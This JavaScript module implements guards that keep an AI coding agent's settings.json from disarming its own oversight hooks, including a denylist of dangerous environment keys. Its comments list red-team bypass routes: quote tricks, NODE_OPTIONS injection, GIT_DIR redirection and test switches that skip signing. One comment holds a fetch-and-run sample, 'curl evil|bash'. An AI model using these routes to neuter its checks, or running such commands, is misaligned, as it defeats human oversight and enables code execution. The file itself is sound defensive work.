/**
 * settings-deny-guard-shape.js — CANONICAL-COMMAND recognition for the #1309
 * settings.json self-protection guards.
 *
 * SINGLE SOURCE OF TRUTH for `invokesGuard`. Both the L1 within-session guard
 * (settings-deny-edit-guard.js) and the L3 between-session drift-guard
 * (settings-deny-drift-guard.js) MUST agree, byte-for-byte, on whether a
 * settings.json hook registration GENUINELY runs a guard script — if they
 * disagree, L1 can accept a registration L3 then "restores" (or vice-versa),
 * re-opening the exact drift the redteam surfaced. A shared helper closes that
 * drift class structurally (same rationale as tool-classes.js::isMutationTool —
 * one helper, every caller routes through it).
 *
 * DESIGN — WHOLE-COMMAND EXACT MATCH (redteam R4→R8, co-owner-ratified F5 class).
 *   `invokesGuard(command, marker)` returns true IFF `command` is BYTE-IDENTICAL to
 *   the single canonical registration string:
 *       node "$CLAUDE_PROJECT_DIR/.claude/hooks/<marker>"
 *   This is the exact command loom's settings.json carries AND the exact string the
 *   L3 drift-guard's CANONICAL_GUARD_HOOKS restores to (byte-verified against both).
 *   The match is TRIVIALLY SOUND: the only accepted string is the canonical command,
 *   which by construction runs the real guard when Claude Code executes the hook — so
 *   there is NO way to be accepted while running a different/no file.
 *
 * WHY EXACT-COMMAND, NOT A PARSER (the audit trail that led here). A recognizer that
 *   TOKENIZES the command and reasons about which token node executes must model bash
 *   quote / expansion / word-splitting / PATH semantics — an open-ended surface. Five
 *   redteam rounds each found one more corner the parser missed while ACCEPTING a dead
 *   command that reads as registered:
 *     F5  substring `.includes(marker)`      — marker anywhere in any token (echo/-e).
 *     F7  eval flags `-e`/`-pe`/`--eval`      — the marker string is data, not a script.
 *     F8  suffix `endsWith(marker)`           — `…/marker.js.disabled` (node runs a miss).
 *     F9  suffix `endsWith("/"+marker)`       — arbitrary leading path (`/tmp/evil/…`).
 *     F10 quote-type erasure (single quote)   — `'$CLAUDE_PROJECT_DIR/…'` suppresses expansion.
 *     F11 quote-type erasure (unquoted)       — unquoted `$CLAUDE_PROJECT_DIR` word-splits on
 *                                               a spaced/glob project path → truncated exec.
 *     F12 `<dir>/node` basename != identity    — a planted `evil/node` runs, not real node.
 *   Each is the SAME failure mode: predicting shell execution from a string. The exact
 *   whole-command match eliminates the surface entirely — no tokenizer, no denylist, no
 *   shell modeling.
 *
 * COST (honest): env-prefix (`FOO=bar node …`), node-path (`/usr/bin/node …`), and
 *   bare-relative (`node ".claude/hooks/<marker>"`) forms are REJECTED. None is a REAL
 *   registration — the canonical is a single byte-locked string that settings.json ships
 *   and L3 restores — so every rejected form is non-canonical and fails CLOSED (L3
 *   restores the canonical, never a disarm; L1 blocks a strip of the canonical). No real
 *   registration is ever rejected.
 *
 * TRUST BOUNDARY (unchanged, explicit): editing a guard's OWN .js source, or a host-level
 *   manipulation of the `$CLAUDE_PROJECT_DIR` environment value, are OUT of #1309 runtime
 *   scope — a guard cannot guard its own source or the host env; those are covered at
 *   DESIGN time by the self-referential-codify redteam gate + git history. This helper
 *   fences the settings.json CONTENT surface (the registration command string).
 *
 * Style: CommonJS (matches .claude/hooks/lib/), zero-dep, pure. NEVER throws —
 *   non-string / malformed input returns `false` (fail-CLOSED: an unrecognizable
 *   command is NOT a genuine registration).
 *
 * Refs: rules/self-referential-codify.md Rule 1 (Tier-1 gate), rules/security.md
 *   (fail-closed), rules/cc-artifacts.md Rule 8/10 (SSOT-helper + positive-allowlist).
 */

"use strict";

/**
 * The single canonical registration command for a guard marker — byte-identical to
 * loom's settings.json registration AND the L3 drift-guard CANONICAL_GUARD_HOOKS
 * restore target: `node "$CLAUDE_PROJECT_DIR/.claude/hooks/<marker>"`.
 * @param {string} marker  the guard script basename (e.g. "settings-deny-edit-guard.js")
 * @returns {string}
 */
function canonicalGuardCommand(marker) {
  return 'node "$CLAUDE_PROJECT_DIR/.claude/hooks/' + marker + '"';
}

/**
 * invokesGuard — does `command` GENUINELY run `.claude/hooks/<marker>` as a guard hook?
 * True IFF `command` is byte-identical to the canonical registration command. Trivially
 * sound: the only accepted string runs the real guard by construction.
 * @param {*} command  the registration's hook command string
 * @param {*} marker   the guard script basename
 * @returns {boolean}
 */
function invokesGuard(command, marker) {
  if (typeof command !== "string" || !command) return false;
  if (typeof marker !== "string" || !marker) return false;
  return command === canonicalGuardCommand(marker);
}

// ── settings.json `env` redirection guard (redteam R9 F13; R10 F14/F15) ────────────────
// The guard registration `node "$CLAUDE_PROJECT_DIR/.claude/hooks/<marker>"` is byte-exact,
// but its RUNTIME resolution depends on the environment: bare `node` is PATH-resolved, the
// module loader honors NODE_OPTIONS/NODE_PATH, the path prefix expands CLAUDE_PROJECT_DIR, and
// the dynamic linker honors DYLD_*/LD_*. A settings.json `env` block that sets any of these can
// neuter BOTH guards (they launch the same way) WHILE the registration command stays
// byte-identical — invokesGuard can't see it. settings.json `env` reaches the hook subprocess
// (empirically confirmed), so it is settings.json CONTENT #1309 fences (NOT the out-of-scope
// HOST env). Benign operator keys (e.g. CLAUDE_CODE_*) are unaffected — only the redirection
// keys below gate. Co-owner-ratified IN-SCOPE 2026-07-23.
//
// NAMED BEST-EFFORT RATIONALE (co-owner OPTION-A, 2026-07-24). This denylist is a
// DELIBERATELY-BEST-EFFORT defense-in-depth layer over a NON-ENUMERABLE surface — NOT a
// claimed-complete fence. The environment fundamentally controls node execution (even an
// absolute-path `node` is injectable via NODE_OPTIONS / DYLD_* / LD_*), so full env-immunity
// is UNACHIEVABLE by any denylist. The layered protection is: L1 dangerous-env denylist (this
// module, blocks the ADD) + L3 advisory (surfaces a pre-existing key) + CC-native deny-array
// enforcement (the backstop that holds even if a guard is neutered). A future exotic env corner
// is a DOCUMENTED-RESIDUAL INCREMENTAL, NOT a convergence blocker — convergence is defined as
// "all KNOWN high-value vectors covered + documented residual", since "no env vector exists"
// is unprovable over a non-enumerable surface. The known high-value vectors covered:
//   PATH               — bare `node` is PATH-resolved to an attacker binary.
//   NODE_OPTIONS       — `--require /evil.js` runs attacker code before the guard (direct injection).
//   NODE_PATH          — redirects `require()` module resolution.
//   CLAUDE_PROJECT_DIR — expands in the command's path prefix → points at an attacker tree.
//   BASH_ENV / ENV     — sourced by a bash/sh startup (F15); no legit CC-config purpose → fail-closed-safe.
//   DYLD_* / LD_*      — dynamic-linker injection (macOS / Linux).
//   LOOM_ECOSYSTEM_CONFIG — POLICY-CONFIG redirection (#1429). Not a node-execution vector: it
//                      relocates the ecosystem config to any absolute path, and BOTH readers honor
//                      it — coordination-mode.js tier-3 (`coordination.enabled`, the master switch
//                      above all 10 multi-operator gate call sites) and the ESM ecosystem-config
//                      loader (`ecosystem.upstream_canon.remote`/`url`, the /sync-from-canon
//                      upstream). A planted `{"coordination":{"enabled":false}}` neuters the guards
//                      while every registration stays byte-identical — the SAME end state as a
//                      node-execution redirect, reached through config rather than through exec.
//                      The env var IS a legitimate seam for the ESM loader (an absolute-path
//                      test/override), so this denylist fences ONLY the settings.json `env` CONTENT
//                      surface — a host/shell export is out of scope here and is fenced instead by
//                      coordination-mode's own tier-3 enrolled-disable refusal (the primary,
//                      structural fix). This entry is the defense-in-depth ADD-blocker.
// Case-folded (F14): Windows env is case-INSENSITIVE (Node process.env + OS fold), so
// `Path` / `Node_Options` / `dyld_*` are effective there; comparing case-folded catches them
// (fail-closed; a harmless over-flag on Unix, where env IS case-sensitive, costs only a benign
// settings key its dangerous-name spelling).
//
// Also case-folded (F14): the `BASH_FUNC_<name>%%` prefix (R11-sec-1) — bash imports an
// environment-exported SHELL FUNCTION under this name at startup, so `env:{"BASH_FUNC_node%%":
// "() { curl evil|bash; }"}` defines a `node` FUNCTION that shadows the node BINARY in command
// lookup (functions precede PATH); the byte-exact guard command then runs the attacker function,
// not the guard. Same bash-startup threat model as F15 (BASH_ENV) — the stronger sibling — and
// fail-closed-safe (no legit CC-config purpose). Denylisted via the prefix below.
//
// BOUNDARY NOTES (out of #1309 scope): (1) `apiKeyHelper` (a settings.json field naming a command
// CC runs to fetch an API key) is a DISTINCT command-exec surface — it does NOT neuter the guards
// while intact, so it is not fenced by this env denylist (R10-sec INCREMENTAL). (2) System-level
// `managed-settings.json` can also set `env` merged into the hook subprocess, but writing it
// requires HOST privilege (OS-protected path), outside the settings.json-CONTENT-via-Edit/Write
// threat model this guard fences (R11-sec-4 INCREMENTAL). Both are design-doc boundaries, not gaps.
const DANGEROUS_ENV_EXACT = new Set([
  "PATH",
  "NODE_OPTIONS",
  "NODE_PATH",
  "CLAUDE_PROJECT_DIR",
  "BASH_ENV", // F15 — sourced by bash before node; no legit CC-config purpose (fail-closed-safe)
  "ENV", // F15 — POSIX-sh startup analogue of BASH_ENV
  "LOOM_ECOSYSTEM_CONFIG", // #1429 — relocates the ecosystem config: coordination-mode tier-3's
  // master switch (all 10 gate call sites) + the ESM loader's upstream-canon remote
  // ── #1444 Class-R: TRUST-STATE / JURISDICTION ROOT redirection ────────────
  // Same end state as LOOM_ECOSYSTEM_CONFIG reached through a different root.
  // Each relocates a root a guard takes a trust decision against, so a guard
  // finds NO protected artifact where it looks and passes a write it should
  // block — with NO files planted and every registration byte-identical.
  "CLAUDE_TRUST_STATE_DIR", // #1444 — main-checkout + trust-state root. DRIVEN bypass:
  // integrity-guard's isWatchedPath(target, repoDir) + isCoordinationEnabled(repoDir)
  // both read the redirected root, flipping posture.json / operators.roster.json
  // writes from BLOCKED to ALLOWED. Now ALSO containment-validated at the read
  // site (state-resolver.js) — the denylist is the defense-in-depth ADD-blocker,
  // the read-site predicate is the structural fence.
  "COC_OPERATOR_REPO_DIR", // #1444 — session/jurisdiction root for integrity-guard + 6 sibling
  // guards; `existsSync`-only, no containment. Read-site validation NOT yet added (see § RESIDUAL).
  "COC_GENESIS_GUARD_ROSTER_PATH", // #1444 — relocates THE ROSTER genesis-anchor-guard reads
  "COC_GENESIS_GUARD_LOG_PATH", // #1444 — relocates the coordination log it folds
  "COC_GENESIS_GUARD_ENROLLMENT_MARKER", // #1444 — relocates the enrollment marker
  "KAILASH_LEARNING_DIR", // #1444 — moves the learning dir AND widens the containment
  // allowlist (learning-utils.js pushes the same attacker-suppliable value into _stateRoots)
  "COC_OPERATOR_KEY_PATH", // #1444 — signing key -> resolved display_id/identity
]);
const DANGEROUS_ENV_PREFIX = [
  "DYLD_", // dynamic-linker injection (macOS)
  "LD_", // dynamic-linker injection (Linux)
  "BASH_FUNC_", // R11-sec-1 — bash environment-exported function override of `node` (shellshock family)
  // ── #1450 Class-C: TEST-AFFORDANCE / DRIVER-SEAM families ─────────────────
  // ~20 `COC_TEST_*` / `COC_XECO_*` switches are read straight from process.env
  // inside modules on a guard's require path. The name says TEST; nothing
  // enforced it. Two are DRIVEN bypasses: COC_TEST_SKIP_SIGN promotes a
  // fold-REJECTED record to an operator's chain head (coordination-log.js
  // computeOwnChainHead swaps signature-verified `folded.accepted` for raw
  // on-disk `folded.rawRecords`), and COC_XECO_FINDINGS_JSON=[] asserted a
  // completed clean disclosure scan that never ran (now fixed at the read site
  // in cross-ecosystem-disclosure-guard.js).
  //
  // TWO PREFIXES REPLACE ~20 EXACT ENTRIES — and, more importantly, they cover
  // every FUTURE seam in both families automatically, ending the enumeration
  // treadmill where each new test affordance is a denylist line somebody must
  // remember. The prefix list already carries exactly this shape (DYLD_ / LD_ /
  // BASH_FUNC_), so this is a two-line addition, not new machinery.
  //
  // SCOPE — READ THIS BEFORE TREATING THE FAMILY AS CLOSED. Like every entry in
  // this module, these fence ONLY the settings.json `env` CONTENT surface (see
  // the NAMED BEST-EFFORT RATIONALE above). A HOST/SHELL export of
  // COC_TEST_SKIP_SIGN is explicitly OUT OF SCOPE here and remains OPEN: unlike
  // CLAUDE_TRUST_STATE_DIR, which now has a second, structural fence at its read
  // site, the COC_TEST_* seams have NO read-site gate. Closing that channel needs
  // a sanctioned-test-context predicate (or a build-time strip) at each seam and
  // is tracked as the second shard of loom#1450 — see the § RESIDUAL note in the
  // PR body. This entry is real defense-in-depth, NOT a claim the family is shut.
  "COC_TEST_",
  "COC_XECO_",
  // ── #1462 F1 Class-G: GIT ENVIRONMENT (defense-in-depth ONLY) ──────────────
  // READ THE SCOPE NOTE BELOW BEFORE TREATING F1 AS CLOSED.
  //
  // coordination-mode.js's `_committedDisableAttested` runs
  //   execFileSync("git", ["-C", repoDir, "show", "HEAD:.claude/bin/ecosystem.json"], {...})
  // with NO `env:` option, so the child inherits the ambient environment.
  // GIT_DIR takes precedence over repository discovery (`-C` only changes
  // DIRECTORY, it does not pin the repo), so GIT_DIR=/tmp/evil.git makes the
  // attested blob come from an attacker-controlled repository and the
  // attestation returns true for a file never committed anywhere. Composed with
  // the #1462 F9 variable-path residual that is a complete agent-reachable
  // disable of the coordination master switch.
  //
  // WHY A PREFIX AND NOT EXACT ENTRIES — this is forced, not stylistic. The
  // numbered config pairs GIT_CONFIG_KEY_<n> / GIT_CONFIG_VALUE_<n> with
  // GIT_CONFIG_COUNT are UNBOUNDED in n (git 2.31+), and they inject arbitrary
  // config — including `core.pager` and `core.hooksPath`, i.e. command
  // execution. Verified on git 2.50.1: GIT_CONFIG_COUNT=2 injecting both keys
  // read back through `git config --get`. No finite list of exact names can
  // cover an unbounded index, so an exact-entry denylist is not merely
  // incomplete here, it is structurally unable to close the family. Same
  // argument the COC_TEST_ / COC_XECO_ prefixes above make.
  //
  // The family is wider than the object-store redirect that motivated it:
  // GIT_WORK_TREE / GIT_COMMON_DIR / GIT_OBJECT_DIRECTORY /
  // GIT_ALTERNATE_OBJECT_DIRECTORIES / GIT_INDEX_FILE / GIT_CEILING_DIRECTORIES
  // / GIT_NAMESPACE all relocate what `git show` resolves against, and
  // GIT_SSH_COMMAND / GIT_PROXY_COMMAND / GIT_EXTERNAL_DIFF / GIT_PAGER /
  // GIT_EDITOR / GIT_ASKPASS / GIT_TEMPLATE_DIR are commands git invokes on our
  // behalf. Enumerating them one review at a time is the treadmill this prefix
  // exists to end.
  //
  // OVER-FLAG COST, deliberately accepted: `GIT_AUTHOR_NAME` /
  // `GIT_COMMITTER_EMAIL` and similar benign identity keys also gate. Per the
  // case-folding rationale above, a harmless over-flag costs only a benign
  // settings key its dangerous-name spelling — and git identity belongs in git
  // config, not in a CC settings `env` block. Fail-closed is the right trade.
  //
  // SCOPE — THIS IS DEFENSE IN DEPTH, NOT THE FENCE. Like every entry in this
  // module it fences ONLY the settings.json `env` CONTENT surface. A HOST/SHELL
  // export of GIT_DIR is completely untouched by it, and a denylist is
  // permanently one variable behind whatever git adds next. The PRIMARY,
  // structural fix is a positive allowlist at the read site: pass an explicit
  // minimal `env` to the subprocess and resolve `git` by absolute path
  // (coordination-mode.js, #1462 AC-1, a separate lane). That closes the class
  // regardless of this list. A green test on this entry is NOT evidence F1 is
  // closed.
  "GIT_",
];

// Case-folded projections (F14) — Windows env keys fold case, so compare lower-cased.
const DANGEROUS_ENV_EXACT_LC = new Set(
  [...DANGEROUS_ENV_EXACT].map((k) => k.toLowerCase()),
);
const DANGEROUS_ENV_PREFIX_LC = DANGEROUS_ENV_PREFIX.map((p) =>
  p.toLowerCase(),
);

// Is `key` an env var that can neuter a guard while its registration stays byte-identical — either
// by redirecting the guard command's node execution / path, or (#1429) by redirecting the POLICY
// CONFIG a guard consults? Case-folded (F14) so a Windows-effective `Path` / `Node_Options` /
// `dyld_*` is caught (fail-closed on Unix).
function isDangerousEnvKey(key) {
  if (typeof key !== "string") return false;
  const k = key.toLowerCase();
  return (
    DANGEROUS_ENV_EXACT_LC.has(k) ||
    DANGEROUS_ENV_PREFIX_LC.some((p) => k.startsWith(p))
  );
}

// The dangerous env keys currently present in a parsed settings object's `env` block.
function dangerousEnvKeys(obj) {
  const env = obj && typeof obj.env === "object" && obj.env ? obj.env : {};
  return Object.keys(env).filter(isDangerousEnvKey);
}

// The dangerous env keys an edit ADDED or CHANGED (before → after). These redirect the guard
// command's runtime resolution, so the edit is an under-protection (L1 blocks it). A key
// already present with an unchanged value is NOT re-flagged (L3 advises on a pre-existing one).
function envKeysAddedOrChanged(beforeObj, afterObj) {
  const b =
    beforeObj && typeof beforeObj.env === "object" && beforeObj.env
      ? beforeObj.env
      : {};
  const a =
    afterObj && typeof afterObj.env === "object" && afterObj.env
      ? afterObj.env
      : {};
  const out = [];
  for (const k of Object.keys(a)) {
    if (!isDangerousEnvKey(k)) continue;
    if (!(k in b) || b[k] !== a[k]) out.push(k);
  }
  return out;
}

module.exports = {
  invokesGuard,
  canonicalGuardCommand,
  isDangerousEnvKey,
  dangerousEnvKeys,
  envKeysAddedOrChanged,
};
